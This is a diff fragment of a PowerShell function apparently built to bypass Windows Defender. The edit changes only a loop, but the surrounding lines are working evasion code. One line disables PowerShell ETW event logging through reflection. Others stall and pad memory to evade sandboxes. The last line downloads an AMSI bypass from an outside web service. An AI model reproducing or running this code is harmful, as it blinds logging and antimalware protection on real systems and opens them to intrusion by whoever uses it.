@@ -3,7 +3,7 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
     [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
     $increment = 0
     $maxincrement = 30000000
-    For ($increment=0; $increment -lt $maxincrement) { $increment++ }
+    For ($increment=0; $increment -lt $maxincrement;$increment++) { $increment++ }
     $powershellmemory = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
     if ($powershellmemory -lt 250) { $fillmybuffer = "a" * 300MB }
     $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
